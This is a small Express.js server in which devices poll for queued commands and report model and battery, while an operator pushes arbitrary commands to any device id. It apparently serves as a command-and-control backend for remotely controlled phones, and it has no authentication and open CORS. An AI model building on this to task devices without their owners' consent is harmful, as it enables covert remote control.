const express = require('express');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

const devices = {};
const commands = {};

app.get('/poll', (req, res) => {
    const { id, model, battery } = req.query;
    if (id) devices[id] = { model: model || "Unknown", battery: battery || "0", last_seen: Date.now() };
    if (commands[id] && commands[id].length > 0) {
        res.json({ cmd: commands[id].shift() });
    } else {
        res.json(null);
    }
});

app.get('/devices', (req, res) => {
    const now = Date.now();
    const active = [];
    for (let id in devices) {
        if (now - devices[id].last_seen < 15000) active.push({ id, model: devices[id].model, battery: devices[id].battery });
    }
    res.json(active);
});

app.get('/check', (req, res) => {
    const id = req.query.id;
    if (devices[id] && (Date.now() - devices[id].last_seen < 15000)) {
        res.json({ status: "online", model: devices[id].model, battery: devices[id].battery });
    } else {
        res.json({ status: "offline" });
    }
});

app.post('/cmd', (req, res) => {
    const { id, cmd } = req.body;
    if (id && cmd) {
        if (!commands[id]) commands[id] = [];
        commands[id].push(cmd);
    }
    res.send("ok");
});

module.exports = app;
